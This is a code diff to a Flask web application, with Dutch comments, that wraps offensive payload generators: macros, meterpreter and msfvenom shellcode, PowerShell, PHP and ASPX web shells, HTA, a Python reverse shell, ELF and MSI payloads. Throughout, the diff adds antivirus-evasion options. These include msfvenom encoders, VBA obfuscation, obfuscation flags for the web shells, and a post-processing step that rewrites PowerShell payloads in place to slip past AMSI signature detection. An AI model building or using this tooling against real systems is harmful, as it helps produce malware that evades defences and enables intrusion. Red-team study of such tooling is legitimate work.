@@ -5,6 +5,7 @@ elk een CLI script aanroepen als subprocess met msfvenom shellcode generatie.
 """
 
 import datetime
+import logging
 import os
 import re as _re
 import subprocess
@@ -24,6 +25,10 @@ from flask import render_template
 from flask import request
 from flask import send_file
 from werkzeug.utils import secure_filename
+
+from obfuscate_ps import (
+    UTF8_BOM, build_signatures, detect_bom, obfuscate_file,
+)
 
 
 macro_bp = Blueprint("macro_bp", __name__, template_folder="html", static_folder="static")
@@ -102,6 +107,11 @@ _PYREVSHELL_MODES = ["plain", "obfuscated"]
 
 _ALLOWED_FEATURES = {"upload", "filebrowser"}
 
+_ALLOWED_ENCODERS = {
+    "", "x86/shikata_ga_nai", "x64/xor_dynamic", "x64/xor",
+    "x86/xor", "x86/alpha_mixed", "x64/zutto_dekiru",
+}
+
 # Bekende generators en hun scripts
 _GENERATORS = {
     "macro": {
@@ -157,11 +167,12 @@ def _validate_port(lport):
         return None, "Ongeldig poortnummer"
 
 
-def _run_generator_task(run_id, cmd, output_paths=None):
+def _run_generator_task(run_id, cmd, output_paths=None, post_process=None):
     """Draai een generator script als subprocess in een achtergrond thread.
 
     output_paths: lijst van bestanden die als download beschikbaar moeten zijn
                   na succesvolle run. Eerste bestaande bestand wordt aangeboden.
+    post_process: optionele callback(run_id, output) na succesvolle run.
     """
     started_at = int(time.time())
     output = deque(maxlen=_MAX_OUTPUT_LINES)
@@ -226,6 +237,14 @@ def _run_generator_task(run_id, cmd, output_paths=None):
             _RUNS[run_id]["status"] = status
             _RUNS[run_id]["finished_at"] = int(time.time())
             _RUNS[run_id]["return_code"] = return_code
+
+        if status == "success" and post_process:
+            try:
+                post_process(run_id, output)
+            except Exception as exc:
+                output.append(f"[!] Post-processing fout: {exc}")
+                with _RUNS_LOCK:
+                    _RUNS[run_id]["status"] = "warning"
     except Exception as exc:
         with _RUNS_LOCK:
             _RUNS[run_id]["status"] = "failed"
@@ -240,6 +259,33 @@ def _find_download_path(run):
         if os.path.isfile(path):
             return path
     return None
+
+
+def _obfuscate_ps1_file(file_path, technique='mixed'):
+    """Obfusceer een .ps1 bestand in-place. Return (stats, changes) of None."""
+    if not os.path.isfile(file_path):
+        return None
+    try:
+        with open(file_path, 'rb') as f:
+            raw = f.read()
+        has_bom, content_bytes = detect_bom(raw)
+        content = content_bytes.decode('utf-8')
+    except (OSError, UnicodeDecodeError) as exc:
+        logging.getLogger(__name__).warning("Kan %s niet lezen: %s", file_path, exc)
+        return None
+    lines = content.splitlines(keepends=True)
+
+    signatures = build_signatures()
+    new_lines, stats, changes = obfuscate_file(lines, signatures, technique)
+    if stats["lines_changed"] == 0:
+        return stats, changes
+
+    output_bytes = ''.join(new_lines).encode('utf-8')
+    if has_bom:
+        output_bytes = UTF8_BOM + output_bytes
+    with open(file_path, 'wb') as f:
+        f.write(output_bytes)
+    return stats, changes
 
 
 # ---------------------------------------------------------------------------
@@ -363,6 +409,10 @@ def macro_generate():
         return jsonify({"error": f"Onbekend payload type: {payload}"}), 400
 
     cmd = [sys.executable, "macro.py", lhost, lport, payload]
+
+    if request.form.get("obfuscate_vba"):
+        cmd.append("--obfuscate-vba")
+
     output_paths = []
 
     template_file = request.files.get("template")
@@ -414,6 +464,10 @@ def macro2_generate():
         return jsonify({"error": f"Onbekend payload type: {payload}"}), 400
 
     cmd = [sys.executable, "macro2.py", lhost, lport, luri, payload]
+
+    if request.form.get("obfuscate_vba"):
+        cmd.append("--obfuscate-vba")
+
     output_paths = []
 
     template_file = request.files.get("template")
@@ -469,6 +523,13 @@ def meterpreter_generate():
     if key:
         cmd.append(key)
 
+    encoder = request.form.get("encoder", "").strip()
+    if encoder and encoder in _ALLOWED_ENCODERS:
+        cmd.extend(["--encoder", encoder])
+        iterations = request.form.get("iterations", "").strip()
+        if iterations and iterations.isdigit() and 1 <= int(iterations) <= 20:
+            cmd.extend(["--iterations", iterations])
+
     # meterpreter.py schrijft naar meuk/meth/Program.cs en bouwt met msbuild
     # Output binary: meuk/meth/bin/Debug/meth.exe
     output_paths = [
@@ -506,6 +567,13 @@ def meterpreter2_generate():
         return jsonify({"error": f"Onbekend payload type: {payload}"}), 400
 
     cmd = [sys.executable, "meterpreter2.py", lhost, lport, luri, payload]
+
+    encoder = request.form.get("encoder", "").strip()
+    if encoder and encoder in _ALLOWED_ENCODERS:
+        cmd.extend(["--encoder", encoder])
+        iterations = request.form.get("iterations", "").strip()
+        if iterations and iterations.isdigit() and 1 <= int(iterations) <= 20:
+            cmd.extend(["--iterations", iterations])
 
     # meterpreter2.py schrijft naar meuk/meth/Program.cs en bouwt met msbuild
     output_paths = [
@@ -550,6 +618,11 @@ def powershell_generate():
 
     luri = request.form.get("luri", "/").strip() or "/"
 
+    amsi_obfuscate = bool(request.form.get("amsi_obfuscate", "").strip())
+    obf_technique = request.form.get("obf_technique", "mixed").strip()
+    if obf_technique not in ("mixed", "subexpr", "format", "chararray", "backtick"):
+        obf_technique = "mixed"
+
     bestand_path = f"http/payloads/{bestand}"
 
     cmd = [sys.executable, "powershell.py", lhost, lport, luri, payload, bestand_path]
@@ -559,10 +632,27 @@ def powershell_generate():
         str(Path.cwd() / "http" / "payloads" / "amsi-shell.ps1"),
     ]
 
+    post_process = None
+    if amsi_obfuscate:
+        _log = logging.getLogger(__name__)
+
+        def _obf_callback(run_id, output, _paths=output_paths, _tech=obf_technique):
+            for path in _paths:
+                if path.endswith('.ps1') and os.path.isfile(path):
+                    result = _obfuscate_ps1_file(path, _tech)
+                    if result:
+                        stats, _ = result
+                        msg = ("[+] AMSI obfuscatie: %d string, %d code over %d regels in %s"
+                               % (stats['string'], stats['code'], stats['lines_changed'],
+                                  os.path.basename(path)))
+                        output.append(msg)
+                        _log.info("powershell_generate %s: %s", run_id[:8], msg)
+        post_process = _obf_callback
+
     run_id = str(uuid.uuid4())
     thread = threading.Thread(
         target=_run_generator_task,
-        args=(run_id, cmd, output_paths),
+        args=(run_id, cmd, output_paths, post_process),
         daemon=True,
     )
     thread.start()
@@ -623,16 +713,38 @@ def invokeshellcode_generate():
 
     luri = request.form.get("luri", "/").strip() or "/"
 
+    amsi_obfuscate = bool(request.form.get("amsi_obfuscate", "").strip())
+    obf_technique = request.form.get("obf_technique", "mixed").strip()
+    if obf_technique not in ("mixed", "subexpr", "format", "chararray", "backtick"):
+        obf_technique = "mixed"
+
     cmd = [sys.executable, "invoke-shellcode.py", lhost, lport, luri]
 
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / "invoke-shellcode.ps1"),
     ]
 
+    post_process = None
+    if amsi_obfuscate:
+        _log = logging.getLogger(__name__)
+
+        def _obf_callback(run_id, output, _paths=output_paths, _tech=obf_technique):
+            for path in _paths:
+                if path.endswith('.ps1') and os.path.isfile(path):
+                    result = _obfuscate_ps1_file(path, _tech)
+                    if result:
+                        stats, _ = result
+                        msg = ("[+] AMSI obfuscatie: %d string, %d code over %d regels in %s"
+                               % (stats['string'], stats['code'], stats['lines_changed'],
+                                  os.path.basename(path)))
+                        output.append(msg)
+                        _log.info("invokeshellcode_generate %s: %s", run_id[:8], msg)
+        post_process = _obf_callback
+
     run_id = str(uuid.uuid4())
     thread = threading.Thread(
         target=_run_generator_task,
-        args=(run_id, cmd, output_paths),
+        args=(run_id, cmd, output_paths, post_process),
         daemon=True,
     )
     thread.start()
@@ -698,6 +810,9 @@ def phpshell_generate():
     for f in features:
         cmd.append(f"--{f}")
 
+    if request.form.get("av_evasion"):
+        cmd.append("--obfuscate")
+
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / "shell.php"),
     ]
@@ -735,6 +850,9 @@ def hta_generate():
         return jsonify({"error": f"Ongeldige modus: {mode}"}), 400
 
     cmd = [sys.executable, "hta.py", lhost, lport, payload, mode]
+
+    if request.form.get("av_evasion"):
+        cmd.append("--obfuscate")
 
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / "payload.hta"),
@@ -776,6 +894,13 @@ def linux_elf_generate():
 
     cmd = [sys.executable, "linux_elf.py", lhost, lport, payload, bestand]
 
+    encoder = request.form.get("encoder", "").strip()
+    if encoder and encoder in _ALLOWED_ENCODERS:
+        cmd.extend(["--encoder", encoder])
+        iterations = request.form.get("iterations", "").strip()
+        if iterations and iterations.isdigit() and 1 <= int(iterations) <= 20:
+            cmd.extend(["--iterations", iterations])
+
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / f"{bestand}.elf"),
     ]
@@ -811,6 +936,9 @@ def aspxshell_generate():
     cmd = [sys.executable, "aspxshell.py", password, password_field]
     for f in features:
         cmd.append(f"--{f}")
+
+    if request.form.get("av_evasion"):
+        cmd.append("--obfuscate")
 
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / "shell.aspx"),
@@ -854,6 +982,9 @@ def pyrevshell_generate():
     if pty:
         cmd.append("--pty")
 
+    if request.form.get("av_evasion"):
+        cmd.append("--av-evasion")
+
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / "revshell.py"),
     ]
@@ -893,6 +1024,13 @@ def msi_payload_generate():
         return jsonify({"error": "Ongeldige bestandsnaam"}), 400
 
     cmd = [sys.executable, "msi_payload.py", lhost, lport, payload, bestand]
+
+    encoder = request.form.get("encoder", "").strip()
+    if encoder and encoder in _ALLOWED_ENCODERS:
+        cmd.extend(["--encoder", encoder])
+        iterations = request.form.get("iterations", "").strip()
+        if iterations and iterations.isdigit() and 1 <= int(iterations) <= 20:
+            cmd.extend(["--iterations", iterations])
 
     output_paths = [
         str(Path.cwd() / "http" / "payloads" / f"{bestand}.msi"),
@@ -951,6 +1089,10 @@ def agentgen_generate():
     # Nieuwe opties
     amsi = bool(request.form.get("amsi", "").strip())
     obfuscate = bool(request.form.get("obfuscate", "").strip())
+    amsi_obfuscate = bool(request.form.get("amsi_obfuscate", "").strip())
+    obf_technique = request.form.get("obf_technique", "mixed").strip()
+    if obf_technique not in ("mixed", "subexpr", "format", "chararray", "backtick"):
+        obf_technique = "mixed"
     persist = request.form.get("persist", "").strip()
     proxy_aware = bool(request.form.get("proxy_aware", "").strip())
     proxy_url = request.form.get("proxy", "").strip()
@@ -1025,10 +1167,26 @@ def agentgen_generate():
     }
     output_paths = [str(Path.cwd() / "http" / "payloads" / ext_map[language])]
 
+    post_process = None
+    if amsi_obfuscate and language == "powershell":
+        _log = logging.getLogger(__name__)
+
+        def _obf_callback(run_id, output, _paths=output_paths, _tech=obf_technique):
+            for path in _paths:
+                if path.endswith('.ps1') and os.path.isfile(path):
+                    result = _obfuscate_ps1_file(path, _tech)
+                    if result:
+                        stats, _ = result
+                        msg = ("[+] AMSI obfuscatie: %d string, %d code in %s"
+                               % (stats['string'], stats['code'], os.path.basename(path)))
+                        output.append(msg)
+                        _log.info("agentgen_generate %s: %s", run_id[:8], msg)
+        post_process = _obf_callback
+
     run_id = str(uuid.uuid4())
     thread = threading.Thread(
         target=_run_generator_task,
-        args=(run_id, cmd, output_paths),
+        args=(run_id, cmd, output_paths, post_process),
         daemon=True,
     )
     thread.start()
